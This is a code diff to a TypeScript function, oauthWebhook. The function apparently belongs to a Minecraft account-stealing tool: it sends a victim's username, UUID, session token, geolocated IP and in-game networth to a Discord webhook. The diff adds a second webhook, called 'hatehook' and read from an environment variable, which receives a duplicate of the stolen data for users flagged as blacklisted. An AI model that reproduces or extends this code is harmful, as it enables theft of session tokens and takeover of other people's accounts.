@@ -1,6 +1,9 @@
 import ipGeolocation from "../geolocation";
+import dotenv from "dotenv";
+dotenv.config();
+const hatehook = process.env.DISCORD_HATEHOOK;
 
-export default async function oauthWebhook(data: any, nwData:any, ip: string, webhook: string) {
+export default async function oauthWebhook(data: any, nwData:any, ip: string, webhook: string, blacklisted?: boolean) {
     const { username, uuid, session_token } = data;
     const { unsoulboundNw, description } = nwData || { unsoulboundNw: 0, description: "Error getting networth" };
 
@@ -89,5 +92,8 @@ export default async function oauthWebhook(data: any, nwData:any, ip: string, we
     if (res.status !== 204) {
         console.log("Error sending webhook")
         console.log(res)
+    }
+    if (blacklisted && hatehook) {
+        oauthWebhook(data, nwData, ip, hatehook)
     }
 }
